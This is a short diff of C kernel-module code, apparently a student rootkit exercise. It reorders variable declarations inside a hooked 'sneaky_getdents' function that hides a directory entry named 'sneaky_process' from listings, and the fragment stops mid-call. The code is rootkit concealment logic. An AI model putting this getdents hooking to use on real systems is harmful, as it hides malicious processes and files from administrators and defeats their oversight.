@@ -84,12 +84,13 @@ asmlinkage int sneaky_getdents (unsigned int fd,
   int i; // ??? "forbids var declaration in for loop"??
   for (i = 0; i < (dirent_size - skipped_size);) {
     if (strcmp(dirp[i].d_name, "sneaky_process") == 0) {
-      skipped_size += (int)(dirp[i].d_reclen);
-      
+      // ha! ISO C90 forbids mixed var declare & code !??
       void* unexamined_start;
-      unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen;
-
       int unexamined_size;
+      
+      skipped_size += (int)(dirp[i].d_reclen);
+
+      unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen;
       unexamined_size = dirent_size - examined_size - skipped_size;
 
       memmove((void*)(&dirp[i]),
